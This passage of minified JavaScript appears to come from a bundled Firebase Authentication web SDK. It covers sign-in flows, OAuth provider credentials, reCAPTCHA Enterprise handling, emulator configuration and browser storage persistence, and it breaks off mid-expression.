ww{constructor(e,t,o,r){this.app=e,this.heartbeatServiceProvider=t,this.appCheckServiceProvider=o,this.config=r,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new x1(this),this.idTokenSubscription=new x1(this),this.beforeStateQueue=new Rw(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=O0,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=r.sdkClientVersion,this._persistenceManagerAvailable=new Promise(l=>this._resolvePersistenceManagerAvailable=l)}_initializeWithPersistence(e,t){return t&&(this._popupRedirectResolver=Wo(t)),this._initializationPromise=this.queue(async()=>{if(!this._deleted&&(this.persistenceManager=await Zs.create(this,e),this._resolvePersistenceManagerAvailable?.(),!this._deleted)){if(this._popupRedirectResolver?._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(t),this.lastNotifiedUid=this.currentUser?.uid||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const t=await Up(this,{idToken:e}),o=await _n._fromGetAccountInfoResponse(this,t,e);await this.directlySetCurrentUser(o)}catch(t){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",t),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){if(Yt(this.app)){const l=this.app.settings.authIdToken;return l?new Promise(c=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(l).then(c,c))}):this.directlySetCurrentUser(null)}const t=await this.assertedPersistence.getCurrentUser();let o=t,r=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const l=this.redirectUser?._redirectEventId,c=o?._redirectEventId,d=await this.tryRedirectSignIn(e);(!l||l===c)&&d?.user&&(o=d.user,r=!0)}if(!o)return this.directlySetCurrentUser(null);if(!o._redirectEventId){if(r)try{await this.beforeStateQueue.runMiddleware(o)}catch(l){o=t,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(l))}return o?this.reloadAndSetCurrentUserOrClear(o):this.directlySetCurrentUser(null)}return De(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===o._redirectEventId?this.directlySetCurrentUser(o):this.reloadAndSetCurrentUserOrClear(o)}async tryRedirectSignIn(e){let t=null;try{t=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return t}async reloadAndSetCurrentUserOrClear(e){try{await Bp(e)}catch(t){if(t?.code!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=dw()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(Yt(this.app))return Promise.reject($o(this));const t=e?Ot(e):null;return t&&De(t.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(t&&t._clone(this))}async _updateCurrentUser(e,t=!1){if(!this._deleted)return e&&De(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),t||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return Yt(this.app)?Promise.reject($o(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return Yt(this.app)?Promise.reject($o(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(Wo(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const t=this._getPasswordPolicyInternal();return t.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):t.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await Lw(this),t=new Dw(e);this.tenantId===null?this._projectPasswordPolicy=t:this._tenantPasswordPolicies[this.tenantId]=t}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new cu("auth","Firebase",e())}onAuthStateChanged(e,t,o){return this.registerStateListener(this.authStateSubscription,e,t,o)}beforeAuthStateChanged(e,t){return this.beforeStateQueue.pushCallback(e,t)}onIdTokenChanged(e,t,o){return this.registerStateListener(this.idTokenSubscription,e,t,o)}authStateReady(){return new Promise((e,t)=>{if(this.currentUser)e();else{const o=this.onAuthStateChanged(()=>{o(),e()},t)}})}async revokeAccessToken(e){if(this.currentUser){const t=await this.currentUser.getIdToken(),o={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:t};this.tenantId!=null&&(o.tenantId=this.tenantId),await jw(this,o)}}toJSON(){return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:this._currentUser?.toJSON()}}async _setRedirectUser(e,t){const o=await this.getOrInitRedirectPersistenceManager(t);return e===null?o.removeCurrentUser():o.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const t=e&&Wo(e)||this._popupRedirectResolver;De(t,this,"argument-error"),this.redirectPersistenceManager=await Zs.create(this,[Wo(t._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){return this._isInitialized&&await this.queue(async()=>{}),this._currentUser?._redirectEventId===e?this._currentUser:this.redirectUser?._redirectEventId===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const e=this.currentUser?.uid??null;this.lastNotifiedUid!==e&&(this.lastNotifiedUid=e,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,t,o,r){if(this._deleted)return()=>{};const l=typeof t=="function"?t:t.next.bind(t);let c=!1;const d=this._isInitialized?Promise.resolve():this._initializationPromise;if(De(d,this,"internal-error"),d.then(()=>{c||l(this.currentUser)}),typeof t=="function"){const f=e.addObserver(t,o,r);return()=>{c=!0,f()}}else{const f=e.addObserver(t);return()=>{c=!0,f()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return De(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=X0(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){const e={"X-Client-Version":this.clientVersion};this.app.options.appId&&(e["X-Firebase-gmpid"]=this.app.options.appId);const t=await this.heartbeatServiceProvider.getImmediate({optional:!0})?.getHeartbeatsHeader();t&&(e["X-Firebase-Client"]=t);const o=await this._getAppCheckToken();return o&&(e["X-Firebase-AppCheck"]=o),e}async _getAppCheckToken(){if(Yt(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const e=await this.appCheckServiceProvider.getImmediate({optional:!0})?.getToken();return e?.error&&sw(`Error while retrieving App Check token: ${e.error}`),e?.token}}function nr(a){return Ot(a)}class x1{constructor(e){this.auth=e,this.observer=null,this.addObserver=xR(t=>this.observer=t)}get next(){return De(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}let fm={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function Mw(a){fm=a}function Z0(a){return fm.loadJS(a)}function _w(){return fm.recaptchaEnterpriseScript}function kw(){return fm.gapiScript}function Nw(a){return`__${a}${Math.floor(Math.random()*1e6)}`}class Ow{constructor(){this.enterprise=new zw}ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}class zw{ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}const Uw="recaptcha-enterprise",ex="NO_RECAPTCHA";class Bw{constructor(e){this.type=Uw,this.auth=nr(e)}async verify(e="verify",t=!1){async function o(l){if(!t){if(l.tenantId==null&&l._agentRecaptchaConfig!=null)return l._agentRecaptchaConfig.siteKey;if(l.tenantId!=null&&l._tenantRecaptchaConfigs[l.tenantId]!==void 0)return l._tenantRecaptchaConfigs[l.tenantId].siteKey}return new Promise(async(c,d)=>{vw(l,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(f=>{if(f.recaptchaKey===void 0)d(new Error("recaptcha Enterprise site key undefined"));else{const p=new bw(f);return l.tenantId==null?l._agentRecaptchaConfig=p:l._tenantRecaptchaConfigs[l.tenantId]=p,c(p.siteKey)}}).catch(f=>{d(f)})})}function r(l,c,d){const f=window.grecaptcha;E1(f)?f.enterprise.ready(()=>{f.enterprise.execute(l,{action:e}).then(p=>{c(p)}).catch(()=>{c(ex)})}):d(Error("No reCAPTCHA enterprise script loaded."))}return this.auth.settings.appVerificationDisabledForTesting?new Ow().execute("siteKey",{action:"verify"}):new Promise((l,c)=>{o(this.auth).then(d=>{if(!t&&E1(window.grecaptcha))r(d,l,c);else{if(typeof window>"u"){c(new Error("RecaptchaVerifier is only supported in browser"));return}let f=_w();f.length!==0&&(f+=d),Z0(f).then(()=>{r(d,l,c)}).catch(p=>{c(p)})}}).catch(d=>{c(d)})})}}async function j1(a,e,t,o=!1,r=!1){const l=new Bw(a);let c;if(r)c=ex;else try{c=await l.verify(t)}catch{c=await l.verify(t,!0)}const d={...e};if(t==="mfaSmsEnrollment"||t==="mfaSmsSignIn"){if("phoneEnrollmentInfo"in d){const f=d.phoneEnrollmentInfo.phoneNumber,p=d.phoneEnrollmentInfo.recaptchaToken;Object.assign(d,{phoneEnrollmentInfo:{phoneNumber:f,recaptchaToken:p,captchaResponse:c,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}else if("phoneSignInInfo"in d){const f=d.phoneSignInInfo.recaptchaToken;Object.assign(d,{phoneSignInInfo:{recaptchaToken:f,captchaResponse:c,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}return d}return o?Object.assign(d,{captchaResp:c}):Object.assign(d,{captchaResponse:c}),Object.assign(d,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(d,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),d}async function _g(a,e,t,o,r){if(a._getRecaptchaConfig()?.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")){const l=await j1(a,e,t,t==="getOobCode");return o(a,l)}else return o(a,e).catch(async l=>{if(l.code==="auth/missing-recaptcha-token"){console.log(`${t} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`);const c=await j1(a,e,t,t==="getOobCode");return o(a,c)}else return Promise.reject(l)})}function Vw(a,e){const t=nb(a,"auth");if(t.isInitialized()){const r=t.getImmediate(),l=t.getOptions();if(Fr(l,e??{}))return r;En(r,"already-initialized")}return t.initialize({options:e})}function Fw(a,e){const t=e?.persistence||[],o=(Array.isArray(t)?t:[t]).map(Wo);e?.errorMap&&a._updateErrorMap(e.errorMap),a._initializeWithPersistence(o,e?.popupRedirectResolver)}function Hw(a,e,t){const o=nr(a);De(/^https?:\/\//.test(e),o,"invalid-emulator-scheme");const r=!1,l=ax(e),{host:c,port:d}=Gw(e),f=d===null?"":`:${d}`,p={url:`${l}//${c}${f}/`},v=Object.freeze({host:c,port:d,protocol:l.replace(":",""),options:Object.freeze({disableWarnings:r})});if(!o._canInitEmulator){De(o.config.emulator&&o.emulatorConfig,o,"emulator-config-failed"),De(Fr(p,o.config.emulator)&&Fr(v,o.emulatorConfig),o,"emulator-config-failed");return}o.config.emulator=p,o.emulatorConfig=v,o.settings.appVerificationDisabledForTesting=!0,cl(c)?($A(`${l}//${c}${f}`),YA("Auth",!0)):Jw()}function ax(a){const e=a.indexOf(":");return e<0?"":a.substr(0,e+1)}function Gw(a){const e=ax(a),t=/(\/\/)?([^?#/]+)/.exec(a.substr(e.length));if(!t)return{host:"",port:null};const o=t[2].split("@").pop()||"",r=/^(\[[^\]]+\])(:|$)/.exec(o);if(r){const l=r[1];return{host:l,port:P1(o.substr(l.length+1))}}else{const[l,c]=o.split(":");return{host:l,port:P1(c)}}}function P1(a){if(!a)return null;const e=Number(a);return isNaN(e)?null:e}function Jw(){function a(){const e=document.createElement("p"),t=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",t.position="fixed",t.width="100%",t.backgroundColor="#ffffff",t.border=".1em solid #000000",t.color="#b50000",t.bottom="0px",t.left="0px",t.margin="0px",t.zIndex="10000",t.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",a):a())}class Ob{constructor(e,t){this.providerId=e,this.signInMethod=t}toJSON(){return Qo("not implemented")}_getIdTokenResponse(e){return Qo("not implemented")}_linkToIdToken(e,t){return Qo("not implemented")}_getReauthenticationResolver(e){return Qo("not implemented")}}async function Qw(a,e){return tr(a,"POST","/v1/accounts:signUp",e)}async function Ww(a,e){return bu(a,"POST","/v1/accounts:signInWithPassword",ar(a,e))}async function Kw(a,e){return bu(a,"POST","/v1/accounts:signInWithEmailLink",ar(a,e))}async function $w(a,e){return bu(a,"POST","/v1/accounts:signInWithEmailLink",ar(a,e))}class iu extends Ob{constructor(e,t,o,r=null){super("password",o),this._email=e,this._password=t,this._tenantId=r}static _fromEmailAndPassword(e,t){return new iu(e,t,"password")}static _fromEmailAndCode(e,t,o=null){return new iu(e,t,"emailLink",o)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e;if(t?.email&&t?.password){if(t.signInMethod==="password")return this._fromEmailAndPassword(t.email,t.password);if(t.signInMethod==="emailLink")return this._fromEmailAndCode(t.email,t.password,t.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":const t={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return _g(e,t,"signInWithPassword",Ww);case"emailLink":return Kw(e,{email:this._email,oobCode:this._password});default:En(e,"internal-error")}}async _linkToIdToken(e,t){switch(this.signInMethod){case"password":const o={idToken:t,returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return _g(e,o,"signUpPassword",Qw);case"emailLink":return $w(e,{idToken:t,email:this._email,oobCode:this._password});default:En(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}async function el(a,e){return bu(a,"POST","/v1/accounts:signInWithIdp",ar(a,e))}const Yw="http://localhost";class Wr extends Ob{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const t=new Wr(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(t.idToken=e.idToken),e.accessToken&&(t.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(t.nonce=e.nonce),e.pendingToken&&(t.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(t.accessToken=e.oauthToken,t.secret=e.oauthTokenSecret):En("argument-error"),t}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e,{providerId:o,signInMethod:r,...l}=t;if(!o||!r)return null;const c=new Wr(o,r);return c.idToken=l.idToken||void 0,c.accessToken=l.accessToken||void 0,c.secret=l.secret,c.nonce=l.nonce,c.pendingToken=l.pendingToken||null,c}_getIdTokenResponse(e){const t=this.buildRequest();return el(e,t)}_linkToIdToken(e,t){const o=this.buildRequest();return o.idToken=t,el(e,o)}_getReauthenticationResolver(e){const t=this.buildRequest();return t.autoCreate=!1,el(e,t)}buildRequest(){const e={requestUri:Yw,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const t={};this.idToken&&(t.id_token=this.idToken),this.accessToken&&(t.access_token=this.accessToken),this.secret&&(t.oauth_token_secret=this.secret),t.providerId=this.providerId,this.nonce&&!this.pendingToken&&(t.nonce=this.nonce),e.postBody=uu(t)}return e}}function Xw(a){switch(a){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function Zw(a){const e=wc(Mc(a)).link,t=e?wc(Mc(e)).deep_link_id:null,o=wc(Mc(a)).deep_link_id;return(o?wc(Mc(o)).link:null)||o||t||e||a}class zb{constructor(e){const t=wc(Mc(e)),o=t.apiKey??null,r=t.oobCode??null,l=Xw(t.mode??null);De(o&&r&&l,"argument-error"),this.apiKey=o,this.operation=l,this.code=r,this.continueUrl=t.continueUrl??null,this.languageCode=t.lang??null,this.tenantId=t.tenantId??null}static parseLink(e){const t=Zw(e);try{return new zb(t)}catch{return null}}}class hl{constructor(){this.providerId=hl.PROVIDER_ID}static credential(e,t){return iu._fromEmailAndPassword(e,t)}static credentialWithLink(e,t){const o=zb.parseLink(t);return De(o,"argument-error"),iu._fromEmailAndCode(e,o.code,o.tenantId)}}hl.PROVIDER_ID="password";hl.EMAIL_PASSWORD_SIGN_IN_METHOD="password";hl.EMAIL_LINK_SIGN_IN_METHOD="emailLink";class Ub{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}class vu extends Ub{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}class Ho extends vu{constructor(){super("facebook.com")}static credential(e){return Wr._fromParams({providerId:Ho.PROVIDER_ID,signInMethod:Ho.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Ho.credentialFromTaggedObject(e)}static credentialFromError(e){return Ho.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Ho.credential(e.oauthAccessToken)}catch{return null}}}Ho.FACEBOOK_SIGN_IN_METHOD="facebook.com";Ho.PROVIDER_ID="facebook.com";class Go extends vu{constructor(){super("google.com"),this.addScope("profile")}static credential(e,t){return Wr._fromParams({providerId:Go.PROVIDER_ID,signInMethod:Go.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:t})}static credentialFromResult(e){return Go.credentialFromTaggedObject(e)}static credentialFromError(e){return Go.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:t,oauthAccessToken:o}=e;if(!t&&!o)return null;try{return Go.credential(t,o)}catch{return null}}}Go.GOOGLE_SIGN_IN_METHOD="google.com";Go.PROVIDER_ID="google.com";class Jo extends vu{constructor(){super("github.com")}static credential(e){return Wr._fromParams({providerId:Jo.PROVIDER_ID,signInMethod:Jo.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Jo.credentialFromTaggedObject(e)}static credentialFromError(e){return Jo.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Jo.credential(e.oauthAccessToken)}catch{return null}}}Jo.GITHUB_SIGN_IN_METHOD="github.com";Jo.PROVIDER_ID="github.com";class Bi extends vu{constructor(){super("twitter.com")}static credential(e,t){return Wr._fromParams({providerId:Bi.PROVIDER_ID,signInMethod:Bi.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:t})}static credentialFromResult(e){return Bi.credentialFromTaggedObject(e)}static credentialFromError(e){return Bi.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:t,oauthTokenSecret:o}=e;if(!t||!o)return null;try{return Bi.credential(t,o)}catch{return null}}}Bi.TWITTER_SIGN_IN_METHOD="twitter.com";Bi.PROVIDER_ID="twitter.com";async function eM(a,e){return bu(a,"POST","/v1/accounts:signUp",ar(a,e))}class Kr{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,t,o,r=!1){const l=await _n._fromIdTokenResponse(e,o,r),c=q1(o);return new Kr({user:l,providerId:c,_tokenResponse:o,operationType:t})}static async _forOperation(e,t,o){await e._updateTokensIfNecessary(o,!0);const r=q1(o);return new Kr({user:e,providerId:r,_tokenResponse:o,operationType:t})}}function q1(a){return a.providerId?a.providerId:"phoneNumber"in a?"phone":null}class Vp extends ni{constructor(e,t,o,r){super(t.code,t.message),this.operationType=o,this.user=r,Object.setPrototypeOf(this,Vp.prototype),this.customData={appName:e.name,tenantId:e.tenantId??void 0,_serverResponse:t.customData._serverResponse,operationType:o}}static _fromErrorAndOperation(e,t,o,r){return new Vp(e,t,o,r)}}function tx(a,e,t,o){return(e==="reauthenticate"?t._getReauthenticationResolver(a):t._getIdTokenResponse(a)).catch(l=>{throw l.code==="auth/multi-factor-auth-required"?Vp._fromErrorAndOperation(a,l,e,o):l})}async function aM(a,e,t=!1){const o=await ou(a,e._linkToIdToken(a.auth,await a.getIdToken()),t);return Kr._forOperation(a,"link",o)}async function tM(a,e,t=!1){const{auth:o}=a;if(Yt(o.app))return Promise.reject($o(o));const r="reauthenticate";try{const l=await ou(a,tx(o,r,e,a),t);De(l.idToken,o,"internal-error");const c=kb(l.idToken);De(c,o,"internal-error");const{sub:d}=c;return De(a.uid===d,o,"user-mismatch"),Kr._forOperation(a,r,l)}catch(l){throw l?.code==="auth/user-not-found"&&En(o,"user-mismatch"),l}}async function nx(a,e,t=!1){if(Yt(a.app))return Promise.reject($o(a));const o="signIn",r=await tx(a,o,e),l=await Kr._fromIdTokenResponse(a,o,r);return t||await a._updateCurrentUser(l.user),l}async function nM(a,e){return nx(nr(a),e)}async function ox(a){const e=nr(a);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}async function oM(a,e,t){if(Yt(a.app))return Promise.reject($o(a));const o=nr(a),c=await _g(o,{returnSecureToken:!0,email:e,password:t,clientType:"CLIENT_TYPE_WEB"},"signUpPassword",eM).catch(f=>{throw f.code==="auth/password-does-not-meet-requirements"&&ox(a),f}),d=await Kr._fromIdTokenResponse(o,"signIn",c);return await o._updateCurrentUser(d.user),d}function iM(a,e,t){return Yt(a.app)?Promise.reject($o(a)):nM(Ot(a),hl.credential(e,t)).catch(async o=>{throw o.code==="auth/password-does-not-meet-requirements"&&ox(a),o})}function rM(a,e,t,o){return Ot(a).onIdTokenChanged(e,t,o)}function sM(a,e,t){return Ot(a).beforeAuthStateChanged(e,t)}function lM(a,e,t,o){return Ot(a).onAuthStateChanged(e,t,o)}function cM(a){return Ot(a).signOut()}const Fp="__sak";class ix{constructor(e,t){this.storageRetriever=e,this.type=t}_isAvailable(){try{return this.storage?(this.storage.setItem(Fp,"1"),this.storage.removeItem(Fp),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,t){return this.storage.setItem(e,JSON.stringify(t)),Promise.resolve()}_get(e){const t=this.storage.getItem(e);return Promise.resolve(t?JSON.parse(t):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}const uM=1e3,dM=10;class rx extends ix{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,t)=>this.onStorageEvent(e,t),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=Y0(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const t of Object.keys(this.listeners)){const o=this.storage.getItem(t),r=this.localCache[t];o!==r&&e(t,r,o)}}onStorageEvent(e,t=!1){if(!e.key){this.forAllChangedKeys((c,d,f)=>{this.notifyListeners(c,f)});return}const o=e.key;t?this.detachListener():this.stopPolling();const r=()=>{const c=this.storage.getItem(o);!t&&this.localCache[o]===c||this.notifyListeners(o,c)},l=this.storage.getItem(o);qw()&&l!==e.newValue&&e.newValue!==e.oldValue?setTimeout(r,dM):r()}notifyListeners(e,t){this.localCache[e]=t;const o=this.listeners[e];if(o)for(const r of Array.from(o))r(t&&JSON.parse(t))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,t,o)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:t,newValue:o}),!0)})},uM)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,t){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,t){await super._set(e,t),this.localCache[e]=JSON.stringify(t)}async _get(e){const t=await super._get(e);return this.localCache[e]=JSON.stringify(t),t}async _remove(e){await super._remove(e),delete this.localCache[e]}}rx.type="LOCAL";const pM=rx;class sx extends ix{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,t){}_removeListener(e,t){}}sx.type="SESSION";const lx=sx;function mM(a){return Promise.all(a.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(t){return{fulfilled:!1,reason:t}}}))}class hm{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const t=this.receivers.find(r=>r.isListeningto(e));if(t)return t;const o=new hm(e);return this.receivers.push(o),o}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const t=e,{eventId:o,eventType:r,data:l}=t.data,c=this.handlersMap[r];if(!c?.size)return;t.ports[0].postMessage({status:"ack",eventId:o,eventType:r});const d=Array.from(c).map(async p=>p(t.origin,l)),f=await mM(d);t.ports[0].postMessage({status:"done",eventId:o,eventType:r,response:f})}_subscribe(e,t){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(t)}_unsubscribe(e,t){this.handlersMap[e]&&t&&this.handlersMap[e].delete(t),(!t||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}hm.receivers=[];function Bb(a="",e=10){let t="";for(let o=0;o<e;o++)t+=Math.floor(Math.random()*10);return a+t}class fM{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,t,o=50){const r=typeof MessageChannel<"u"?new MessageChannel:null;if(!r)throw new Error("connection_unavailable");let l,c;return new Promise((d,f)=>{const p=Bb("",20);r.port1.start();const v=setTimeout(()=>{f(new Error("unsupported_event"))},o);c={messageChannel:r,onMessage(y){const S=y;if(S.data.eventId===p)switch(S.data.status){case"ack":clearTimeout(v),l=setTimeout(()=>{f(new Error("timeout"))},3e3);break;case"done":clearTimeout(l),d(S.data.response);break;default:clearTimeout(v),clearTimeout(l),f(new Error("invalid_response"));break}}},this.handlers.add(c),r.port1.addEventListener("message",c.onMessage),this.target.postMessage({eventType:e,eventId:p,data:t},[r.port2])}).finally(()=>{c&&this.removeMessageHandler(c)})}}function yo(){return window}function hM(a){yo().location.href=a}function cx(){return typeof yo().WorkerGlobalScope<"u"&&typeof 